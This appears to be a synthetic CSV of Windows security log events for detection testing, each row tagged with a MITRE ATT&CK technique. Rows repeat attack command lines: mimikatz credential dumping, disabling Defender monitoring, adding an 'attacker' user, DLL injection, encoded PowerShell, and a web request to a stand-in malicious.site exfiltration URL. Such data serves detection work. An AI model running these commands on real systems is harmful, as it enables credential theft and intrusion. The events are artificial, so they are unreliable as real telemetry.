timestamp,sourcetype,EventCode,MITRE_Technique,Description,CommandLine,NewProcessName,Source_Network_Address,DestinationPort,User,ParentProcessName
2024-05-28 14:12:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.114,3389,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 14:14:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.138,80,Administrator,C:\Windows\System32\smss.exe
2024-05-28 14:16:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.131,80,SYSTEM,C:\Windows\System32\lsass.exe
2024-05-28 14:18:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.112,8443,testuser,C:\Windows\System32\explorer.exe
2024-05-28 14:20:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.130,22,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 14:22:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.114,80,jdoe,C:\Windows\System32\wininit.exe
2024-05-28 14:24:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.108,22,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 14:26:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 13,C:\Simulated\mstsc.exe,192.168.56.129,443,Administrator,C:\Windows\System32\smss.exe
2024-05-28 14:28:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.104,445,Administrator,C:\Windows\System32\wininit.exe
2024-05-28 14:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.124,445,SYSTEM,C:\Windows\System32\lsass.exe
2024-05-28 14:32:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.103,443,SYSTEM,C:\Windows\System32\services.exe
2024-05-28 14:34:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.124,80,svc-account,C:\Windows\System32\services.exe
2024-05-28 14:36:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.101,445,Administrator,C:\Windows\System32\services.exe
2024-05-28 14:38:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.133,445,testuser,C:\Windows\System32\cmd.exe
2024-05-28 14:40:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.121,443,svc-account,C:\Windows\System32\taskhostw.exe
2024-05-28 14:42:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.135,80,SYSTEM,C:\Windows\System32\lsass.exe
2024-05-28 14:44:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.117,8443,svc-account,C:\Windows\System32\wininit.exe
2024-05-28 14:46:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 23,C:\Simulated\mstsc.exe,192.168.56.133,443,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 14:48:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.121,22,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 14:50:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.126,80,jdoe,C:\Windows\System32\taskhostw.exe
2024-05-28 14:52:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.112,3389,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 14:54:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.118,3389,svc-account,C:\Windows\System32\smss.exe
2024-05-28 14:56:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.104,8443,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 14:58:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.113,8080,Administrator,C:\Windows\System32\taskhostw.exe
2024-05-28 15:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.139,8443,testuser,C:\Windows\System32\smss.exe
2024-05-28 15:02:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.106,22,testuser,C:\Windows\System32\smss.exe
2024-05-28 15:04:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.102,22,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 15:06:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 33,C:\Simulated\mstsc.exe,192.168.56.104,8080,Administrator,C:\Windows\System32\taskhostw.exe
2024-05-28 15:08:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.135,3389,SYSTEM,C:\Windows\System32\taskhostw.exe
2024-05-28 15:10:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.119,22,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 15:12:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.100,80,SYSTEM,C:\Windows\System32\lsass.exe
2024-05-28 15:14:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.122,8080,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 15:16:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.102,443,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 15:18:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.137,443,SYSTEM,C:\Windows\System32\taskhostw.exe
2024-05-28 15:20:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.140,80,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 15:22:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.105,8443,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 15:24:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.150,8443,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 15:26:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 43,C:\Simulated\mstsc.exe,192.168.56.124,8443,Administrator,C:\Windows\System32\services.exe
2024-05-28 15:28:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.148,3389,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 15:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.144,8443,Administrator,C:\Windows\System32\lsass.exe
2024-05-28 15:32:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.128,80,testuser,C:\Windows\System32\smss.exe
2024-05-28 15:34:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.130,8443,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 15:36:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.146,3389,svc-account,C:\Windows\System32\wininit.exe
2024-05-28 15:38:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.112,80,Administrator,C:\Windows\System32\wininit.exe
2024-05-28 15:40:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.149,3389,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 15:42:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.111,22,testuser,C:\Windows\System32\cmd.exe
2024-05-28 15:44:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.140,80,testuser,C:\Windows\System32\explorer.exe
2024-05-28 15:46:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 53,C:\Simulated\mstsc.exe,192.168.56.127,22,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 15:48:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.113,80,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 15:50:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.135,3389,jdoe,C:\Windows\System32\taskhostw.exe
2024-05-28 15:52:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.141,445,SYSTEM,C:\Windows\System32\lsass.exe
2024-05-28 15:54:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.140,445,jdoe,C:\Windows\System32\services.exe
2024-05-28 15:56:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.140,445,svc-account,C:\Windows\System32\lsass.exe
2024-05-28 15:58:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.127,8443,jdoe,C:\Windows\System32\wininit.exe
2024-05-28 16:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.101,80,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 16:02:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.114,443,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 16:04:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.102,8443,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 16:06:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 63,C:\Simulated\mstsc.exe,192.168.56.106,8443,SYSTEM,C:\Windows\System32\taskhostw.exe
2024-05-28 16:08:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.118,445,testuser,C:\Windows\System32\wininit.exe
2024-05-28 16:10:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.141,8443,svc-account,C:\Windows\System32\wininit.exe
2024-05-28 16:12:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.102,8080,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 16:14:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.135,22,Administrator,C:\Windows\System32\smss.exe
2024-05-28 16:16:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.116,8080,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 16:18:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.143,443,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 16:20:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.144,80,jdoe,C:\Windows\System32\lsass.exe
2024-05-28 16:22:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.138,3389,SYSTEM,C:\Windows\System32\services.exe
2024-05-28 16:24:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.149,443,SYSTEM,C:\Windows\System32\services.exe
2024-05-28 16:26:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 73,C:\Simulated\mstsc.exe,192.168.56.130,445,jdoe,C:\Windows\System32\lsass.exe
2024-05-28 16:28:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.136,3389,svc-account,C:\Windows\System32\lsass.exe
2024-05-28 16:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.132,445,SYSTEM,C:\Windows\System32\services.exe
2024-05-28 16:32:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.131,3389,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 16:34:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.113,8443,svc-account,C:\Windows\System32\taskhostw.exe
2024-05-28 16:36:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.122,3389,Administrator,C:\Windows\System32\lsass.exe
2024-05-28 16:38:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.136,8443,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 16:40:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.139,445,svc-account,C:\Windows\System32\wininit.exe
2024-05-28 16:42:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.120,22,SYSTEM,C:\Windows\System32\services.exe
2024-05-28 16:44:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.146,8443,svc-account,C:\Windows\System32\wininit.exe
2024-05-28 16:46:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 83,C:\Simulated\mstsc.exe,192.168.56.122,80,Administrator,C:\Windows\System32\wininit.exe
2024-05-28 16:48:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.118,22,SYSTEM,C:\Windows\System32\taskhostw.exe
2024-05-28 16:50:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.120,8443,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 16:52:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.123,445,jdoe,C:\Windows\System32\taskhostw.exe
2024-05-28 16:54:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.132,3389,testuser,C:\Windows\System32\explorer.exe
2024-05-28 16:56:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.118,443,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 16:58:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.146,22,jdoe,C:\Windows\System32\smss.exe
2024-05-28 17:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.134,8080,svc-account,C:\Windows\System32\lsass.exe
2024-05-28 17:02:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.117,8080,svc-account,C:\Windows\System32\services.exe
2024-05-28 17:04:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.136,8443,SYSTEM,C:\Windows\System32\smss.exe
2024-05-28 17:06:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 93,C:\Simulated\mstsc.exe,192.168.56.103,80,Administrator,C:\Windows\System32\explorer.exe
2024-05-28 17:08:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.124,8080,SYSTEM,C:\Windows\System32\cmd.exe
2024-05-28 17:10:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.139,8443,testuser,C:\Windows\System32\taskhostw.exe
2024-05-28 17:12:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.105,3389,SYSTEM,C:\Windows\System32\lsass.exe
2024-05-28 17:14:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.139,8443,testuser,C:\Windows\System32\wininit.exe
2024-05-28 17:16:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.128,80,jdoe,C:\Windows\System32\explorer.exe
2024-05-28 17:18:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.105,8080,Administrator,C:\Windows\System32\wininit.exe
